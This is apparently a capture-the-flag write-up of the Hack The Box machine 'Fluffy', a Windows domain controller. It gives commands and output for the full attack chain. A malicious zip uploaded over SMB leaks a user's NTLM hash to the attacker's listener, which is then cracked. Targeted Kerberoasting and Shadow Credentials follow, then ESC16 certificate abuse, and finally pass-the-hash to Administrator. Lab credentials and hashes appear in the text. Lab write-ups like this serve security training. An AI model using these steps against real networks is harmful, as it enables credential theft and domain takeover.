# Fluffy

j.fleischman:J0elTHEM4n1990!

Nmap scan

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 fluffy.htb         
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-09-30 18:30 EDT
Nmap scan report for fluffy.htb (10.10.11.69)
Host is up (0.15s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-30T22:08:41+00:00; -22m31s from scanner time.
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  wsman
```

Trying to connect with the creds given

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb fluffy.htb -u ' j.fleischman' -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\\ j.fleischman:J0elTHEM4n1990! (Guest)
```

Trying to list shares, we get access denied.

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.fluffy.htb -u ' j.fleischman' -p 'J0elTHEM4n1990!' --shares 
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\\ j.fleischman:J0elTHEM4n1990! (Guest)
SMB         10.10.11.69     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

It fails with nxc, but works with smbmap

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.69:445 Name: dc01.fluffy.htb           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```

We have read / write on the IT share

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\\\\\dc01.fluffy.htb\\\\IT -U 'j.fleischman%J0elTHEM4n1990!'     
Try "help" to get a list of possible commands.
smb: \\> ls 
  .                                   D        0  Tue Sep 30 18:15:51 2025
  ..                                  D        0  Tue Sep 30 18:15:51 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
```

We get the pdf, it mentions CVEs. One get our attention so we try it

It consists of creating a malicious zip file, send it to the victim (SMB upload) and receive their hash

We create the file with a PoC

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 PoC.py hack 10.10.16.2

[+] File hack.library-ms created successfully.
```

Upload the file

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\\\\\dc01.fluffy.htb\\\\IT -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \\> put exploit.zip 
putting file exploit.zip as \\exploit.zip (0.8 kb/s) (average 0.8 kb/s)
smb: \\> ls 
  .                                   D        0  Tue Sep 30 18:23:17 2025
  ..                                  D        0  Tue Sep 30 18:23:17 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      315  Tue Sep 30 18:23:17 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
```

Launch responder and get the hash

```shellscript
[+] Listening for events...                                                                                                                                                                                                                 

[*] Skipping previously captured hash for FLUFFY\\p.agila
[*] Skipping previously captured hash for FLUFFY\\p.agila
[*] Skipping previously captured hash for FLUFFY\\p.agila
[*] Skipping previously captured hash for FLUFFY\\p.agila
[*] Skipping previously captured hash for FLUFFY\\p.agila

```

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.69.txt
p.agila::FLUFFY:a750545dbdd4e39d:171C840F18B3971F0C093DD20D56E2BD:010100000000000080922BEB8BDBDB0188C86FA8152432A10000000002000800300050005800490001001E00570049004E002D0049003000370058004B0044003600500043004D004C0004003400570049004E002D0049003000370058004B0044003600500043004D004C002E0030005000580049002E004C004F00430041004C000300140030005000580049002E004C004F00430041004C000500140030005000580049002E004C004F00430041004C000700080080922BEB8BDBDB0106000400020000000800300030000000000000000100000000200000664465F022C955ED61F3ECAFFF730B6EE8AB2F05E64208040CB2F7FB3C1848580A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300034000000000000000000
```

Crack the hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
```

p.agila:prometheusx-303

Try the creds

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'                                                            
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303
```

List shares to see if we have more permissions ⇒ we don’t

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares 
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

We will now try to run bloodhound

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --collection All --dns-server 10.10.11.69
LDAP        10.10.11.69     389    dc01.fluffy.htb  [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 
LDAP        10.10.11.69     389    DC01             Resolved collection methods: group, psremote, rdp, session, trusts, acl, dcom, container, localadmin, objectprops
LDAP        10.10.11.69     389    DC01             Done in 00M 27S
LDAP        10.10.11.69     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.69_2025-09-30_185001_bloodhound.zip
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FBARNQh455bc3wQ0mLRTS%2Fimage.png?alt=media&#x26;token=17f00f9a-70eb-44c3-a08e-af7d9453554a" alt=""><figcaption></figcaption></figure>

With GenericAll, we can add ourself for the service accounts group

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d FLUFFY --host dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila 
[+] p.agila added to SERVICE ACCOUNTS
```

Check that the user was indeed added

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d fluffy --host dc01.fluffy.htb -u p.agila -p 'prometheusx-303' get object 'SERVICE ACCOUNTS'

distinguishedName: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
cn: Service Accounts
dSCorePropagationData: 2025-04-19 12:38:12+00:00
groupType: -2147483646
instanceType: 4
member: CN=winrm service,CN=Users,DC=fluffy,DC=htb; CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb; CN=ldap service,CN=Users,DC=fluffy,DC=htb; CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
```

Now that we are part of service accounts, we have generic write over the other users

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FLqKubTjHz8czRJIyql9g%2Fimage.png?alt=media&#x26;token=6c7f8015-a1f6-4044-a845-316a4f5650bc" alt=""><figcaption></figcaption></figure>

We can perform a targeted kerberoast attack

```shellscript
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ ./targetedKerberoast.py -v -d 'FLUFFY.HTB' -u 'p.agila' -p 'prometheusx-303'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$FLUFFY.HTB$FLUFFY.HTB/ca_svc*$1cb0e7859174fbf57906cf93ccdaf225$f1e4e2c56239b5eb11edf3dd719c52dcbca67cadfc7da59e81525af88cf2cd663783c03c8b9ef64f463fca0f6d589de400c9166ab799fd57fa0c028f212cece03534522f269952ce0bb8e9025e12fd583f99d223dbe32f2f4cb4dd93ca83acde7442c9dc5b45c21db0da339cf9ebd26339d07b7194a14eed0b3e3feb61a3f1c44836868df5e7149d6e7dc3b94fd599b4ba53fa320c70b05fdb3428b5bd1e3ba52b0977351f6c39f4d1aea5b040dbfa1f130f3648ed533873fd0929862d889cf8a52ae4ca490b7c6f721b9c536a85d8c7da00ef1e88c03c115eab4a3b95795302423313857f5402422c05484709ec5d80dc0125baa29ef012a6f0bae9048996f6c3f6e9bdd6b246618f9a0e19b849fb3cb965d12593b61023a83ccb33e63bff9753cc0709d7d6ffefdabd4c60b1084e86038d40d5f6e6a9d19bc28e8816c189974723d73f48dbbb3a6951a4f66885bfc67fee69d36e4770afb1dda973a423862970184eb1ad3ebe7e28658ec16119e0eaccd1b6040f7108d22240336e195a1c47717fa0133bc528013dab16487472f31aa99a5e5a10af0dc3cba639eeb368280be4a9b88059d5acddd76e5d338ca9e45d845ee754dff419c2ae94893cda5b82e5d048c60f0c67af685f49f2e0dc2e7163b270926cf8dc19a314d2d5c23af9d7eda773b74f80f9732fbf5cf03aeda646ea01f7dfffbd95400c04fc52247ec5099a4d80bed0f47a3a0479cb429530b75392f60148047b6fb7dcbd15a40627c7dc275edab3d44848ee01159eab5872709680bd2e004c1413a5aef17530d5606f8898744328e897b907aa8a34781d5b46ca05cf9966de8bedc1a3a95837314d62886c72f3cce4f5cec35e6bc05c6821324be8e6d049a663aae7f401ad88aa985a89305fb02416bb04636685bb9657a8f547c4f30436f9ec89abfe94ade29b7c800df391c1285a9b887a9ef93bf8fe465959a546b0024afe7895b8610131a53fbed3c926daa7d552b9ae90aeaf08f7e036bf4dbfe2063f6462b0faf67a228b938c2a0e314166dea665d732ea913757dba9790b2fbe9bb0782f9498ba43c3f2f2b64de52d0b4f00210c33c7099481a7b75b6c6504246706586d73e5a18470946ed373f09724e74c62c2fa4f308f52223f5f85cdd2870a135170952d208284bbefe04880628c1d6fcb59d9d3976cf3aed35d06ce5784fe60ce00eba26176b9fd1a822683cda4b4b8ce2abb47f3ebdeda630d3c9a31dc3893739880c969f4d7514417859b00b478c5efadb668ba3c7f88ba055a1a5dad6cdf70210db7bae2fb732fec5a06fcf2f47f009bfc9da035c387498269998d77100622d7564a077c43823a4b0cdc8dab378ed2835266c2e2fc6a3cad368c5a3fd69082fb673a71c5f61b500756b99383dd77e7937472ebfd111fab3534aa3db51b89ab4c7c4b4ec1100f716a0b2ca171c64fdc5eb312e70ad125defafcf3b0e504f76a4d624f447a5022495e2ae3a9bc719dfde0399cf908
[+] Printing hash for (ldap_svc)
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$FLUFFY.HTB/ldap_svc*$c47fd2637d84a96dc01ed42c0570aab5$43592bee8888bf37bad46f6b3d6e7d1e2a0a8b0086e525ffe10a754712a8db270f068a3bf12158936302b2d6b79e2b7fc5eadbc4c7c69747b3c908087d3951252a6fcbd0a65b0cd053e3e101f95f0fafed285b17d89fb7f0b575e3d33b013654c7bda983cd80e8a67aae7f782a906000675460d355b76025534699faebf2079e84ca861997eeeac2c6fe4cf543381d6f903367bb99a25879b9cdf759405439cde68fe698ef941ae69d2d380577c95d369fedce449de75caa69af25199c6a8455a88a5750629d2bfbfd17d212e1290ca2971ad729ca97045083516b77981358c3f6f9b5a93116a60a020c97fc2d8475eebd033f4363469076886a718f39fbfe817a25c454c9b2cacc7b9bd3ef8c384bb4b359aa0b0cff7d83982041910b0d52b34701e0214224d045ed14b56651e1f09b0138a99248b88fe0d14d922ab00bb708cd4a5b7f87f44196fa1eabd00adf4526cb58e8aa08e14120693462353235b3cdaeb38540196fadbc4448ddb0cfe4c808d8da252d4e9ef768b43ef481b0a28689a3a43b661cb10523c7a60196a451f9054e548a4b9516b4165f1970aabd01ccfae5d14c4efcb33033c59177d8e4763fc09f8b7d1e748c4a4fe00852188ad562484c0628e11f5bb0efb7220bb959b5e492a46bf522d2b95f1e3b86c6360f20f0ee6cfaa40932aa99300b9aee270d4a8ff0d36637a91e250554525cd1f4507b2b163e3ebd802cbd172e4d6184d9bbf8bf47a8ce6b77052522ec3a5f314d615b1224d961e72fdba28d69f3a24c9c4355377d7bcb1ad6eae6a3f4a6e1595cea3ccfb59fd6f7cca2695e33ad515a40c17d7a6acebbf68101e9a0e633961ca33bfd9d655c7816ff7e6e35440d551b43f3ec3356d702116671e9c1cf98303f008739dcf59378359b318e450599eb102e8e153c4fe9ce2dbc391e0fe2ee02ebd9810767d8a8cdd412283732ec90fd410af7b0181572b3c6d4cb425c0e65742abb1a2abafd83d2def0d5d9cade692f4a6ddace87006726b8835bd060c788ff7b0142977ad3c3d75c1aa4587cbdc838ebbb58b0bfc61dc11ef9722e65f187c6958ac7ba85767fcf045c3aa0597b75240205ca0747f691e51548f7e4d2f03da2814f6967db640decac57a6567d51d835093235bbaaf1e8e97c7e5c6b02e0c749ba9f36582292afe5a9024a05cb66f84333482fc0486b6485f512541534b421791eaf3d08fe5a1585f72552d3e7fd0204bdd6bf1fb2f0afb98175f19284eabb9230219c237812a3434874360881417b2ce92ba55ccea08b40e46a66cd1b8aa22c1be3b7a42fc0d0fe0d3cde91af91eb8817f0f41ed969a915e05f55b4c3f8b9fa850890be65ca024f14170339bda43a0182a98a598101f0debe0293884f21b48d41cbb67bd4de0a97f53b3445f37b06e7baf0b8adf04e37cd6e1b1733e3cc200b5d1a90281892dbcfe21ff7b14f6f305b7911b192f820e16919d4aeba147edba7ea4f1094e61b710c999777b0519d34db
[+] Printing hash for (winrm_svc)
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$FLUFFY.HTB/winrm_svc*$3211c139b71e15e180d1fdd1d49dabf4$2d32791d7c6f7604a5d1962a8b403a25e9132285ec9192ed3065c656fb6577561da23c749670250c3f7bd9a136bac438f2b83b27eb7ee61bedd1fc7a31a7315d9d3883d3c8f847d6c72223892c312ab3526d622f4404f612cf02912279a784f652d911aa1ff32d7d5e086645d94c8b498f0380a15d217fe3f1b08827a3db9c3864a1757940fb6203bb5e84d766ac4d1b1a0fe0a9974a0ab5c672fd8c40fa12451caaec552e9b11557e5688380a03a4c844b78f2bad1cee0a175a9dcbc3b9c3c1d23b6eae4f589a549f835897752ed27488b9d472bdd8537666ad029cb1e224950471cbec4142a7eaafcbfb1824275f067314321166e5ce7cc40bc44209db7237dfde8c1206ec6e05ecda96819f9f0a48bc44231a9c0b4c38fe693a3a78989c21a3fb6889f2fc946af1d381c908b642faf38e7040fcfae9d18c3588d519bbdf564d0743564013c4f8c169251f7a44f73a99aa6e00c10ab820653ab97fab1dffdb76f7221c51101b510e9fe501c2b17f3fe9fdaf7acf04f4d8b874f848d3f1b97bbd02f45856279b905b684589b0cad2be94985a8de449c1ff95ad929c095b1f1253149e5f224bac43e8908ca9962b7c4fbc89821e369b4a2b898893c0202bd2a2a58bf91864458ec5de3799b873d056469db5fc8af04937d91021efebe395a207358c05c34547be1d7f861742ce8c627a1185b7fb84bb8da8e7d66cdeff8c721b55570f49bfcf89582c94795f27ceab9c4a596ff2389797e2f6dd93caa172584ffcf0273356d629af5c72cc49942710f62bf31917f2e391fbf7381a5aa124c09c4dc16b0f4315fa138e6a72d0b9d3b4b2fb69a5d41c54e8f37fa5e633884db791a2a7454c6ee8accbf9ae54a72683390a62526215616db07abd038f40419b3136511fc592662eaec1daacbc7af9cf0db0cef5f7bba7b74e818695cc26b8e8dc9676a6c75741eccc7b5a385ff9fb4e5acc0127c44bc442a0510af4686919099fe2cb4d7a82fb53d44b35dabc47f6a46a4847c7cda2b5bb9e0b23f1373545572d7b39c3ed5b566ebde2896e872ef5500bea26e96a4719705a79db72dc41e99568eea59929e0365fc5e5be41de4b7f266154a6ff0edf803272ef7456dda85c805d6d71544388dece006ffa88e19dadaafc251acc615ffbd355e9d7679515629e44f2285d0dfa15294ab22fd311edc25b41ba532c0d2ad6917353f6f8249ae2748fb5653e8fb7b5c2e3769fa987e4aea41723746a24ef4ec2e89acf3efdb42e3d02b28a8e09d3bb9a980a29c5ef9f05ceb61d02d4c2683262048330187d9fa39d19d35e3060982985b671933ea6c96f2d624a151d2f45d8ff00ca55366dfa630ae989bd31b94376012efefe0e5dac89ba6320f0477ac71a42d55cb657a88108fe373df04817a064ee50e417d4bd59ebe87047a2fe4dbeb2e480ffd78f2d657f0783de98f7693ec545d2e90fd7b1ea228d23b704a806c64bf83759665d6744608c036189717b8ee365def7cd7a
```

We get hashes for 3 services accounts, now we need to crack them ⇒ cracking did not work, so we can try the Shadow credential attack ⇒ We get the NT hash for all users

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "winrm_svc" -ns 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9e7e5b4cbc8544718f8b67bd378ac71a'
[*] Adding Key Credential with device ID '9e7e5b4cbc8544718f8b67bd378ac71a' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '9e7e5b4cbc8544718f8b67bd378ac71a' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "ldap_svc" -ns 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ldap_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b74a2470cc8d44178742b89908bb477f'
[*] Adding Key Credential with device ID 'b74a2470cc8d44178742b89908bb477f' to the Key Credentials for 'ldap_svc'
[*] Successfully added Key Credential with device ID 'b74a2470cc8d44178742b89908bb477f' to the Key Credentials for 'ldap_svc'
[*] Authenticating as 'ldap_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ldap_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ldap_svc.ccache'
[*] Wrote credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37

┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "ca_svc" -ns 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3f4d9a2dff404c648a7c4cf9edd8257c'
[*] Adding Key Credential with device ID '3f4d9a2dff404c648a7c4cf9edd8257c' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '3f4d9a2dff404c648a7c4cf9edd8257c' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

We can then winrm with winrm\_svc

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents> dir 
*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents> dir ..\\Desktop

    Directory: C:\\Users\\winrm_svc\\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2025   3:07 PM             34 user.txt
```

We also have access to ca\_svc so we use certipy to see if any certificate templates are vulnerable ⇒ ESC16

```shellscript
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -enabled -vulnerable 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\\Domain Admins
                                          FLUFFY.HTB\\Enterprise Admins
                                          FLUFFY.HTB\\Administrators
        ManageCertificates              : FLUFFY.HTB\\Domain Admins
                                          FLUFFY.HTB\\Enterprise Admins
                                          FLUFFY.HTB\\Administrators
        Enroll                          : FLUFFY.HTB\\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

To exploit it, we need to control a user who has Write permission over the user we want to use. In our case, we need to use ca\_svc to exploit ESC16 because it is the user who is part of the CA group. So we will use p.agila to change the UPN of ca\_svc to the Administrator UPN, as p.agila has write permissions over ca\_svc

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad account -u p.agila@fluffy.htb -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn administrator -user ca_svc update 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

For the next step, we need the admin SID, so we get it from our winrm session

```shellscript
*Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop> (Get-LocalUser -Name Administrator).SID.Value
S-1-5-21-497550768-2797716248-2627064577-500
```

Next we use our user ca\_svc with our new spn to request a certificate for the Administrator user.

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User -upn administrator@fluffy.htb -sid 'S-1-5-21-497550768-2797716248-2627064577-500' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Next we unmap the relation between our user and the Admin user

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad account -u p.agila@fluffy.htb -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn ca_svc -user ca_svc update 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

Finally we get the the NTLM hash for the admin account

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.69 -domain fluffy.htb 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

We use evil winrm to pass the hash and auth as Admin

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
